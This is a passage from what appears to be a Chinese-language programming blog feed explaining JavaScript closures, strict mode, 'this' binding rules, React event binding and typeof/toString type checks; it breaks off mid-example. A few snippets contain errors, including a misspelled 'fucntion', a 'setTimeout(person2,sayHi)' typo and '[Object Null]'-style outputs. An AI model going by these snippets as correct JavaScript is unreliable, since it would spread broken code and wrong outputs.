class="built_in">console</span>.log(counter1.value())</span><br></pre></td></tr></table></figure></p><p><br></p><p><em>使用匿名闭包</em><br>使用匿名闭包，使得循环中被创建的方法，不会共享同一个词法作用域。或者，使用let而不是var，就不需要增加额外的闭包。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHelp</span>(<span class="params">help</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'help'</span>).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupHelp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> helpText = [</span><br><span class="line">      &#123;<span class="string">'id'</span>: <span class="string">'email'</span>, <span class="string">'help'</span>: <span class="string">'Your e-mail address'</span>&#125;,</span><br><span class="line">      &#123;<span class="string">'id'</span>: <span class="string">'name'</span>, <span class="string">'help'</span>: <span class="string">'Your full name'</span>&#125;,</span><br><span class="line">      &#123;<span class="string">'id'</span>: <span class="string">'age'</span>, <span class="string">'help'</span>: <span class="string">'Your age (you must be over 16)'</span>&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    <span class="comment">// (function() &#123;</span></span><br><span class="line">    <span class="comment">//   var item = helpText[i];</span></span><br><span class="line">    <span class="comment">//   document.getElementById(item.id).onfocus = function() &#123;</span></span><br><span class="line">    <span class="comment">//     showHelp(item.help);</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;)()</span></span><br><span class="line">    <span class="keyword">let</span> item = helpText[i];</span><br><span class="line">    <span class="built_in">document</span>.getElementById(item.id).onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      showHelp(item.help);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-4s-use-strict"><a href="#1-4s-use-strict" class="headerlink" title="1.4s use strict"></a>1.4s use strict</h4><p>使用严格模式，可以减少意外创建全局变量，导致内存泄露的情况。一些在正常模式下可以运行的语句，在严格模式下将不能运行。</p><table><thead><tr><th>正常模式</th><th style="text-align:right">严格模式</th></tr></thead><tbody><tr><td>如果一个变量没有声明就赋值，默认是全局变量</td><td style="text-align:right">严格模式禁止这种用法，全局变量必须显式声明</td></tr><tr><td>允许动态绑定，即某些属性和方法属于哪一个对象，不是在编译时确定的，而是在运行时确定的</td><td style="text-align:right">严格模式在某些情况下，只允许静态绑定，属性和方法归属哪个对象，在编译阶段就确定。<br>1. 禁止使用with语句<br>2. 增加eval作用域 </td></tr><tr><td></td><td style="text-align:right">禁止this关键字指向全局对象 <br> <code>function f(){ &quot;use strict&quot;; this.a = 1; } f(); // 报错，this未定义</code></td></tr><tr><td></td><td style="text-align:right">禁止删除变量，只有configurable为true的对象属性才能被删除 </td></tr><tr><td></td><td style="text-align:right">显示报错 </td></tr><tr><td></td><td style="text-align:right">重名错误：对象、函数参数不能有重名的属性 </td></tr><tr><td></td><td style="text-align:right">禁止八进制表示法 <code>var n = 0100 // error</code></td></tr><tr><td></td><td style="text-align:right">不允许对arguments赋值，arguments不再追踪参数的变化, 禁止使用arguments.callee</td></tr><tr><td></td><td style="text-align:right">新版JS会引入块级作用域。为了与新版本接轨，严格模式只允许在全局作用域，或函数作用域的顶层声明函数。不允许在非函数的代码块内声明函数。</td></tr><tr><td></td><td style="text-align:right">保留字，implements, interface, let, package, private, protected, public, static, yield, class, enum, export, extends, import, super, const 使用这些词作为变量名将报错</td></tr></tbody></table><p><br></p><h3 id="2-this"><a href="#2-this" class="headerlink" title="2. this"></a>2. this</h3><p>上面讲到在创建执行山下文时，会确定this的值。<em><code>this</code></em>本身是一个指针，指向调用函数的对象。如何准确判断this指向的是什么？<em>this永远指向最后调用它的那个对象</em>。</p><p><br></p><h4 id="2-1-默认绑定"><a href="#2-1-默认绑定" class="headerlink" title="2.1 默认绑定"></a>2.1 默认绑定</h4><p>默认绑定，在不能应用其他绑定规则时使用的默认规则，通常是独立函数调用。</p><p>在调用<code>a()</code>时，相当于执行了<code>window.a()</code>，这个时候<code>this</code>指向<code>window对象</code>。<br>严格模式下，<code>this</code>指向undefined, undefined上没有this对象，会抛出错误<code>Uncaught TypeError: Cannot read property &#39;name&#39; of undefined</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Amy'</span></span><br><span class="line">a();  <span class="comment">// 浏览器下 hello,Amy</span></span><br><span class="line"><span class="comment">// node环境下 hello,undefined。因为node中name并不是挂在全局对象上的</span></span><br></pre></td></tr></table></figure><p>看下面这个例子，<code>fn</code>仍然是被<code>window</code>调用的，所有<code>this</code>仍然指向<code>window</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"windowsName"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">'Cherry'</span>;</span><br><span class="line">  innerFunction();</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">innerFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);      <span class="comment">// windowsName</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn()</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-隐式绑定"><a href="#2-2-隐式绑定" class="headerlink" title="2.2 隐式绑定"></a>2.2 隐式绑定</h4><p>函数的调用是在某个对象上触发的，典型形式为<em><code>XXX.fun()</code></em>， 调用位置上存在上下文对象。</p><p>sayHi函数声明在外部，严格来说不属于person， 但在调用sayHi时，调用位置会使用person的上下文来引用函数，隐式绑定会把函数调用中的this绑定到这个上下文对象。（注意，不管有多少层调用，只有最后一层会确定this指向的是什么）<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  name: <span class="string">'Sarah'</span>,</span><br><span class="line">  friend: person2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span></span><br><span class="line">person1.friend.sayHi()  <span class="comment">// Hi,Amy</span></span><br></pre></td></tr></table></figure></p><p><br></p><p><em>隐式绑定丢失</em><br>Hi直接指向了sayHi的引用，在调用的时候，跟person没有关系。<em><code>XXX.fn()</code></em>如果<code>fn()</code>前什么都没有，那肯定不是隐式绑定，但也不一定就是默认绑定。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = person.sayHi;</span><br><span class="line">Hi();   <span class="comment">// Hello,Mike</span></span><br></pre></td></tr></table></figure></p><p>在<strong>回调函数</strong>中，也会存在隐式绑定丢失。</p><ul><li>第一条输出中，<code>setTimeout</code>的回调函数中，this使用的是默认绑定，非严格模式下，this指向全局对象</li><li>第二条输出中，<code>setTimeout(fn, delay){ fn() }</code>，相当于将<code>person2.sayHi</code>赋值给了一个变量，最后执行了这个变量，因此sayHi中的this和person2就没有关系了。</li><li>第三条输出中，执行的是<code>person2.sayHi()</code>，所以this指向person2。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  name: <span class="string">'Sarah'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line">person1.sayHi();                <span class="comment">// hello,Mike</span></span><br><span class="line">setTimeout(person2,sayHi, <span class="number">100</span>); <span class="comment">// hello,Mike</span></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  person2.sayHi()</span><br><span class="line">&#125;, <span class="number">200</span>)                         <span class="comment">// hello,Sarah</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-3-显式绑定"><a href="#2-3-显式绑定" class="headerlink" title="2.3 显式绑定"></a>2.3 显式绑定</h4><p>通过<code>call</code>, <code>apply</code>, <code>bind</code>的方式，显示的指定this的值。call,apply,bind的第一个参数，就是指定this所指向的对象。call和apply的作用一样，只是传参方式不同。call和apply都会执行对应的函数，而bind方法不会。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = person.sayHi;</span><br><span class="line">Hi.call(person);     <span class="comment">// hello,Amy</span></span><br></pre></td></tr></table></figure></p><p><br></p><p><em>显式绑定丢失</em><br><code>Hi.call(person, person.sayHi)</code>的确将this绑定到Hi中的this。但在执行fn的时候，相当于直接调用了sayHi方法（没有显式板顶， person.sayHi已经赋值给fn, 隐式绑定也丢失了）。因此对应的是默认绑定。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = fucntion(fn) &#123;</span><br><span class="line">  fn();           <span class="comment">// wrong: hello,Mike</span></span><br><span class="line">  fn.call(<span class="keyword">this</span>);  <span class="comment">// true:  hello,Amy</span></span><br><span class="line">&#125;</span><br><span class="line">Hi.call(person, person.sayHi);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-new绑定"><a href="#2-4-new绑定" class="headerlink" title="2.4 new绑定"></a>2.4 new绑定</h4><p>在javascript中，构造函数只是使用new操作符时被调用的函数，这些函数和普通的函数并没有什么不同，它不属于某个类，也不可能实例实例出一个类。任何一个函数都可以使用new来调用，因此其实并不存在构造函数，而只有对于函数的“构造调用”。</p><p>使用new来调用函数，会自动执行下面的操作：</p><ul><li>创建一个新对象</li><li>将构造函数的作用域复制给新对象，即this指向这个新对象</li><li>执行构造函数中的代码</li><li>返回新对象</li></ul><p>因此，我们使用new来调用函数的时候，新对象会绑定到这个函数的this上。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Hi = <span class="keyword">new</span> sayHi(<span class="string">'Amy'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(Hi.name);   <span class="comment">// Amy</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-其他"><a href="#3-其他" class="headerlink" title="3. 其他"></a>3. 其他</h3><h4 id="3-1-绑定优先级"><a href="#3-1-绑定优先级" class="headerlink" title="3.1 绑定优先级"></a>3.1 绑定优先级</h4><p>优先级: new绑定 &gt; 显式绑定 &gt; 隐式绑定 &gt; 默认绑定</p><h4 id="3-2-绑定null-undefined"><a href="#3-2-绑定null-undefined" class="headerlink" title="3.2 绑定null,undefined"></a>3.2 绑定null,undefined</h4><p>将null, undefined作为this的绑定对象传入call, apply, bind，这些值在调用时会被忽略，实际应用的是默认绑定规则</p><h4 id="3-3-箭头函数"><a href="#3-3-箭头函数" class="headerlink" title="3.3 箭头函数"></a>3.3 箭头函数</h4><p>箭头函数的 this 始终指向函数定义时的 this，而非执行时。<br>箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值。<br>箭头函数没有自己的this，因此不能用call, apply, bind这些方法去改变this的执行。它的this继承于外层代码库中的this。</p><h4 id="3-4-面试题"><a href="#3-4-面试题" class="headerlink" title="3.4 面试题"></a>3.4 面试题</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  number: <span class="number">3</span>,</span><br><span class="line">  fn: (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> number;</span><br><span class="line">    <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">    number = number * <span class="number">2</span>;</span><br><span class="line">    number = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> num = <span class="keyword">this</span>.number;</span><br><span class="line">      <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(num);</span><br><span class="line">      number *= <span class="number">3</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(number)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myFun = obj.fn;    </span><br><span class="line">myFun.call(<span class="literal">null</span>);   <span class="comment">// 10, 9</span></span><br><span class="line">obj.fn();           <span class="comment">// 3, 27</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.number)  <span class="comment">// 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10, 9, 3, 27, 20</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-5-React绑定事件"><a href="#3-5-React绑定事件" class="headerlink" title="3.5 React绑定事件"></a>3.5 React绑定事件</h4><p>在Javascript中，class的方法默认不会绑定<code>this</code>。如果<code>this.handleClick</code>没有bind.this，这时这个函数的this的值是undefined。</p><p> 在render方法中使用Function.prototype.bind, 或者使用箭头函数，都会在每次组件渲染时创建一个新的函数，可能会影响性能。应在构造函数中绑定。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wrong</span></span><br><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.handleClick.bind(<span class="keyword">this</span>)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.deleteRow.bind(<span class="keyword">this</span>, id)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// wrong</span></span><br><span class="line">&lt;button onClick=&#123;() =&gt; <span class="keyword">this</span>.handleClick()&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">  <span class="keyword">super</span>(props);</span><br><span class="line">  <span class="keyword">this</span>.handleClick = <span class="keyword">this</span>.handleClick.bind(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><br></p><ul><li>传递参数给事件处理器<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onClick=&#123;() =&gt; <span class="keyword">this</span>.handleClick(id)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;button onClick=&#123;(e) =&gt; <span class="keyword">this</span>.handleClick(e)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;button onClick=&#123;(e) =&gt; <span class="keyword">this</span>.deleteRow(id, e)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.handleClick.bind(<span class="keyword">this</span>, id)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>  <span class="comment">// 跟上面等价</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>通过data-attributes传递参数<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;li data-letter=&#123;letter&#125; onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;</span><br><span class="line"></span><br><span class="line">handleClick(e) =&gt; &#123;</span><br><span class="line">  <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">    letter: e.target.dataset.letter</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/YvetteLau/Blog/issues/6" target="_blank" rel="noopener">嗨，你真的懂this吗？</a></li><li><a href="https://react.docschina.org/docs/faq-functions.html" target="_blank" rel="noopener">在组件中使用事件处理函数</a></li><li><a href="https://yehudakatz.com/2011/08/11/understanding-javascript-function-invocation-and-this/" target="_blank" rel="noopener">Understanding JavaScript Function Invocation and “this”</a></li><li><a href="https://juejin.im/post/5ba32171f265da0ab719a6d7" target="_blank" rel="noopener">理解 JavaScript 中的执行上下文和执行栈</a></li><li><a href="https://juejin.im/post/5b684f30f265da0f9f4e87cf" target="_blank" rel="noopener">javascript 垃圾回收机制</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures" target="_blank" rel="noopener">闭包</a></li><li><a href="http://www.ruanyifeng.com/blog/2013/01/javascript_strict_mode.html" target="_blank" rel="noopener">Javascript严格模式详解</a></li><li><a href="https://juejin.cn/post/6844903496253177863" target="_blank" rel="noopener">this、apply、call、bind</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS 变量类型 typeof、instanceof、Object.prototype.toString</title>
      <link href="/2019/07/29/JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2019/07/29/JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-typeof"><a href="#1-typeof" class="headerlink" title="1. typeof"></a>1. typeof</h3><p><em><code>typeof</code></em>判断变量属于哪个基本类型。我们可以用typeof来判断undefined, boolean, number, string, object, symbol, function这7种类型。</p><p><em><code>typeof</code></em> 实现原理 : js在底层存储变量的时候，会在变量的机器码的低位1-3位存储其类型信息: 000-对象， 010-浮点数， 100-字符串，110-布尔，1-整数，所有机器码均为0-null，-2^30整数来表示-undefined。</p><p>当<code>typeof null</code>时， 由于<code>null</code>的所有机器码均为0，因此被当做了对象来判断。因此，typeof用于判断基本数据类型，避免对null的判断。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 七种基本类型</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>      <span class="comment">// 'undefined'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span>           <span class="comment">// 'boolean'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">42</span>             <span class="comment">// 'number'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">'42'</span>           <span class="comment">// 'string'</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;<span class="attr">life</span>: <span class="number">42</span>&#125;     <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125; <span class="comment">// 'function'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Symbol</span>()       <span class="comment">// 'symbol'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// other</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">void</span> <span class="number">0</span>         <span class="comment">// 'undefined'</span></span><br><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]        <span class="comment">// 'object' 数组，其实也是对象</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Date</span>()     <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>           <span class="comment">// 'object' js的bug导致返回object</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-Object-prototype-toString-call"><a href="#2-Object-prototype-toString-call" class="headerlink" title="2. Object.prototype.toString.call"></a>2. Object.prototype.toString.call</h3><p>Object.prototype.toString.call() 判断对象属于哪个内置类型。</p><p>ES5中每种内置对象都定义了<em><code>[[Class]]</code></em>内部属性的值。宿主对象的[[Class]]内部属性的值可以是除了Arguments, Array, Boolean, Date, Error, Function, JSON, Math, Number, Object, RegExp, String的任何字符串。</p><p>ES6中，之前的<em><code>[[Class]]</code></em>不再使用，取而代之的是<code>internal slot</code>。Internal slots对应于与对象相关联并由各种es规范算法使用的内部状态，它们没有对象属性，也不能被继承。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">null</span>)            <span class="comment">// "[Object Null]"  </span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">undefined</span>)       <span class="comment">// "[Object Undefined]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="number">123</span>)             <span class="comment">// "[Object Number]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">true</span>)            <span class="comment">// "[Object Boolean]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="string">'123'</span>)           <span class="comment">// "[Object String]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(&#123;<span class="attr">a</span>: <span class="number">123</span>&#125;)        <span class="comment">// 